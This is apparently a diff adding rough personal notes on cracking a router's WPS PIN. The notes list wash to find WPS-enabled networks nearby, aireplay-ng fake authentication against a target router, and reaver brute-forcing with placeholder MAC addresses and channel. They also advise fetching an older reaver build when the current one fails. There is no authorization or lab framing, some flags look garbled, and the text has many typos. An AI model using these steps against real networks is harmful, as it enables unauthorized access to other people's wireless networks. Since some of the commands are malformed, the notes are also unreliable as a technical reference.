@@ -1,0 +1,26 @@
+in monitor mode 
+
+
+wash -- interface wlan0   <- to see all the network near whoes wps is on 
+lck means if it wil lock after few attempt
+
+aireplay-ng --fakeauth 30 -a macaddress_of_router -h mac_address_of_usbnetwork_adopter wlan0
+
+
+in second window 
+
+
+reaver --bssid *mac address of router* --channel ** --interface wlan0 -vvv -no-associates 
+this is most likely not to work
+
+
+therefore downlowad old version of reaver
+
+
+cd download
+
+
+chmod +x reaver<- to make it exacutable
+then use 
+./ <- and the command to let it work
+./reaver --bssid *mac address of router* --channel ** --interface wlan0 -vvv -no-associates 
